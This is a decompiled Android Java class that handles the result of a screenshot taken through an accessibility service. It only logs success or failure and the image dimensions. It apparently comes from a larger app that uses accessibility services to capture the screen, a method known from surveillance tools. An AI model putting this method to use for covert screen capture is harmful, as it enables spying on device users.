package com.hawkshaw.library.features.accessibility;

import Y1.K;
import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityService$TakeScreenshotCallback;
import com.hawkshaw.library.logger.Logger;
import i.C0528x;
import me.pushy.sdk.lib.jackson.databind.a;

public final class GlobalActionKt$takeScreenshot$callback$1 implements AccessibilityService$TakeScreenshotCallback {
    public void onFailure(int i5) {
        Logger.d$default(Logger.INSTANCE, MainAccessibilityService.TAG, C0528x.b("TakeScreenshot: Failed, errorCode ", i5), false, 4, (Object) null);
    }

    public void onSuccess(AccessibilityService.ScreenshotResult screenshotResult) {
        K.n(screenshotResult, "screenshot");
        screenshotResult.getHardwareBuffer().getHeight();
        Logger.d$default(Logger.INSTANCE, MainAccessibilityService.TAG, a.g("TakeScreenshot: success (", screenshotResult.getHardwareBuffer().getHeight(), ", ", screenshotResult.getHardwareBuffer().getWidth()), false, 4, (Object) null);
        screenshotResult.getHardwareBuffer().close();
    }
}
